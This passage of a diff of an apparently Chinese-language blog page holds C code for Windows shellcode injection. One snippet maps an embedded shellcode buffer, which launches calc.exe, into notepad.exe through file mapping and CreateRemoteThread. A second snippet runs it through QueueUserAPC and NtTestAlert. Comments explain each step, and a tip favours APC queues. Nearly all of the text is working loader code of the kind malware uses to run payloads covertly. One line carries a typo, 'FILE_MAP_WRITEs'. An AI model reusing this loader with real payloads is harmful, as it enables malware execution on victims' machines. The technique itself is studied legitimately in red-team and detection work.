+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Tlhelp32.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#pragma comment (lib, &#34;OneCore.lib&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">DWORD</span> <span class="nf">GetProcessIdByName</span><span class="p">(</span><span class="n">LPCTSTR</span> <span class="n">lpszProcessName</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">hSnapshot</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROCESSENTRY32</span> <span class="n">pe</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pe</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="n">pe</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">do</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpi</span><span class="p">(</span><span class="n">lpszProcessName</span><span class="p">,</span> <span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="n">pe</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x63\x2e\x65\x78\x65\x00</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">//申请了一段进程虚拟地址，相当于代替了VirtualAlloc，这里不需要从磁盘文件读取shellcode，所以没用到CreateFile。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">HANDLE</span> <span class="n">hMapping</span> <span class="o">=</span> <span class="n">CreateFileMapping</span><span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">LPVOID</span> <span class="n">lpMapAddress</span> <span class="o">=</span> <span class="n">MapViewOfFile</span><span class="p">(</span><span class="n">hMapping</span><span class="p">,</span> <span class="n">FILE_MAP_WRITEs</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">//复制shellcode到分配的进程虚拟地址中，lpMapAddress为该地址空间的首地址。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">memcpy</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">lpMapAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">GetProcessIdByName</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;notepad.exe&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//向另一进程中写入该虚拟地址空间的内容，相当于代替WriteProcessMemory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">LPVOID</span> <span class="n">lpMapAddressRemote</span> <span class="o">=</span> <span class="n">MapViewOfFile2</span><span class="p">(</span><span class="n">hMapping</span><span class="p">,</span> <span class="n">hProcess</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//创建远程线程
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">HANDLE</span> <span class="n">hRemoteThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">lpMapAddressRemote</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">UnmapViewOfFile</span><span class="p">(</span><span class="n">lpMapAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hMapping</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>Tips: 使用文件映射进行远程进程注入的缺点是它仅适用于 x86→x86 和 x64→x64。VirtualAllocEx与WriteProcessMemory支持跨位数的注入。</p>
 <p>推荐后面不使用 MapViewOfFile2和CreateRemoteThread 来注入远程线程，而是使用APC队列。</p>
@@ -790,12 +790,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">HANDLE</span> <span class="n">hMapping</span> <span class="o">=</span> <span class="n">CreateFileMapping</span><span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
-<span class="n">LPVOID</span> <span class="n">lpMapAddress</span> <span class="o">=</span> <span class="n">MapViewOfFile</span><span class="p">(</span><span class="n">hMapping</span><span class="p">,</span> <span class="n">FILE_MAP_WRITE</span><span class="o">|</span> <span class="n">FILE_MAP_EXECUTE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
-<span class="n">memcpy</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">lpMapAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
-<span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">lpMapAddress</span><span class="p">,</span> <span class="n">GetCurrentThread</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">);</span>
-<span class="n">NtTestAlert</span><span class="p">();</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HANDLE</span> <span class="n">hMapping</span> <span class="o">=</span> <span class="n">CreateFileMapping</span><span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">LPVOID</span> <span class="n">lpMapAddress</span> <span class="o">=</span> <span class="n">MapViewOfFile</span><span class="p">(</span><span class="n">hMapping</span><span class="p">,</span> <span class="n">FILE_MAP_WRITE</span><span class="o">|</span> <span class="n">FILE_MAP_EXECUTE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">memcpy</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">lpMapAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">lpMapAddress</span><span class="p">,</span> <span class="n">GetCurrentThread</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">NtTestAlert</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
 <ol>
